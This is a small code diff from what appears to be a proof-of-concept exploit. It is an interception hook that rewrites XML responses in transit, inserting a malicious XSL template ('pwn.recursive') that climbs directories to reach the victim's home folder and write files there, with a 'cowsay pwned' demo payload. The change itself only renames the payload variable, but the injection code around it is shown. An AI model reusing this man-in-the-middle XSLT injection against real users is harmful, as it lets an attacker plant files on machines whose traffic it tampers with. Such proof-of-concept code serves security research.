@@ -24,7 +24,7 @@ file_data = 'cowsay pwned\n'
 # FIXME: I couldn't find a way to determine home directory with XSL.
 # Oh well, let's hope cwd is within $HOME, and try ".", "..", "../.."
 # and so on.
-payload = r'''
+code = r'''
 <xsl:template name="pwn.recursive">
     <xsl:param name="dir" select="'.'"/>
     <xsl:if test="string-length($dir) &lt; 100">
@@ -56,7 +56,7 @@ def response(flow):
     )
     text = re.sub(
         '(<xsl:template match="/">)',
-        r'{payload}\1\n<xsl:call-template name="pwn.recursive"/>\n'.format(payload=payload),
+        r'{code}\1\n<xsl:call-template name="pwn.recursive"/>\n'.format(code=code),
         text
     )
     flow.response.text = text
